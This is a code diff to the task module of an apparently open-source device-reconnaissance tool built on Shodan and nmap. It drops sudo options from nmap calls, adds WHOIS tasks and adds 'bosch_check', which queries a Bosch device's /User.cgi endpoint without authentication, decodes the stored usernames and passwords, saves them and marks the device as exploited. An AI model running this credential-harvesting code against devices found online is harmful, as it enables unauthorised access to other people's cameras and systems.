@@ -39,17 +39,6 @@ from django.conf import settings
 
 logger = logging.getLogger(__name__)
 
-# Warn once at import time when sudo mode is active so operators are reminded
-# to configure sudoers env_keep (see kamerka/tool_settings.py for details).
-if getattr(settings, "NMAP_USE_SUDO", False):
-    logger.warning(
-        "KAMERKA_NMAP_SUDO is enabled.  Nmap will run under sudo.  "
-        "Ensure sudoers preserves required env vars:\n"
-        "  Defaults env_keep += "
-        "\"SHODAN_API_KEY REDIS_URL CELERY_BROKER_URL CELERY_RESULT_BACKEND\"\n"
-        "or start the Celery worker as root so no sudo wrapper is needed."
-    )
-
 healthcare_queries = {"zoll": "http.favicon.hash:-236942626",
                       'dicom': "dicom",
                       "perioperative": "HoF Perioperative",
@@ -1529,8 +1518,7 @@ def scan(id):
     type = device1.type
 
     if type in ics_scan.keys():
-        nm = NmapProcess(ip, options="-p " + str(port) + " " + ics_scan[type],
-                         sudo=settings.NMAP_USE_SUDO)
+        nm = NmapProcess(ip, options="-p " + str(port) + " " + ics_scan[type])
         nm.run_background()
 
         while nm.is_running():
@@ -1567,8 +1555,7 @@ def scan(id):
 
 
     else:
-        nm = NmapProcess(ip, options="-p " + str(port),
-                         sudo=settings.NMAP_USE_SUDO)
+        nm = NmapProcess(ip, options="-p " + str(port))
         nm.run_background()
 
         while nm.is_running():
@@ -1698,6 +1685,100 @@ def whoisxml(id):
     wh.save()
 
 
+@shared_task(bind=False)
+def whois_ip(id):
+    """Alias for whoisxml — performs an RDAP/WHOIS lookup on the device IP."""
+    return whoisxml(id)
+
+
+@shared_task(bind=False)
+def whois_domain(id):
+    """Perform a WHOIS lookup on the device hostname/domain and save to the Whois model.
+
+    Falls back to an IP-based RDAP lookup via whoisxml() when no hostname is
+    available or the domain lookup fails.
+    """
+    device1 = Device.objects.get(id=id)
+
+    hostnames = device1.hostnames or ""
+    domain = ""
+    if hostnames:
+        candidates = [h.strip() for h in hostnames.split(",") if h.strip()]
+        if candidates:
+            domain = candidates[0]
+
+    if not domain:
+        return whoisxml(id)
+
+    name = org = street = city = netrange = admin_org = admin_email = admin_phone = email = ""
+
+    try:
+        import whois as python_whois
+        w = python_whois.whois(domain)
+        name = w.get("name", "") or ""
+        org = w.get("org", "") or ""
+        emails = w.get("emails", []) or []
+        email = emails[0] if isinstance(emails, list) and emails else str(emails or "")
+        registrar = w.get("registrar", "") or ""
+        if not org:
+            org = registrar
+    except Exception as exc:
+        logger.warning("domain whois failed for %s: %s", domain, exc)
+        return whoisxml(id)
+
+    wh = Whois(device=device1, org=org, street=street, city=city,
+               admin_org=admin_org, admin_email=admin_email,
+               admin_phone=admin_phone, netrange=netrange, name=name, email=email)
+    wh.save()
+    return {"domain": domain, "org": org, "name": name, "email": email}
+
+
+@shared_task(bind=False)
+def bosch_check(id):
+    """Retrieve Bosch device credentials via the /User.cgi endpoint.
+
+    Decodes the base64-encoded username and password fields returned by the
+    Bosch Security CGI API and persists them to the Bosch model.
+    """
+    device1 = Device.objects.get(id=id)
+    ip = device1.ip
+    port = device1.port
+
+    return_dict = {}
+    try:
+        req = requests.get(
+            "http://{}:{}/User.cgi?cmd=get_user".format(ip, port),
+            timeout=10,
+        )
+        doc = xmltodict.parse(req.text)
+        for user_key, user_data in doc.get("USER_SETTING", {}).items():
+            if user_key == "result":
+                continue
+            if not isinstance(user_data, dict):
+                continue
+            try:
+                username = base64.b64decode(user_data.get("USERNAME", "")).decode("utf-8")
+                password = base64.b64decode(user_data.get("PWD", "")).decode("utf-8")
+                if username:
+                    return_dict[username] = password
+                    Bosch.objects.update_or_create(
+                        device=device1,
+                        defaults={"username": username, "password": password},
+                    )
+            except Exception:
+                continue
+    except Exception as exc:
+        logger.warning("bosch_check failed for %s: %s", ip, exc)
+        return {"error": str(exc)}
+
+    if return_dict:
+        device1.exploit = return_dict
+        device1.exploited_scanned = True
+        device1.save()
+
+    return return_dict
+
+
 def _shodan_convert(download_path, fmt):
     """Run ``shodan convert <download_path> <fmt>`` and return the output path.
 
@@ -1794,7 +1875,7 @@ def nmap_rtsp_scan(id, ports=None, timing=None):
     elif device_type in ("dahua", "amcrest"):
         options += ",http-auth"
 
-    nm = NmapProcess(ip, options=options, sudo=settings.NMAP_USE_SUDO)
+    nm = NmapProcess(ip, options=options)
     nm.run_background()
 
     while nm.is_running():
@@ -1977,7 +2058,7 @@ def deep_protocol_scan(device_id, protocol=None):
         options = "-p {} --script={}".format(scan_port, scripts)
 
         try:
-            nm = NmapProcess(ip, options=options, sudo=settings.NMAP_USE_SUDO)
+            nm = NmapProcess(ip, options=options)
             nm.run_background()
 
             start_time = time.time()
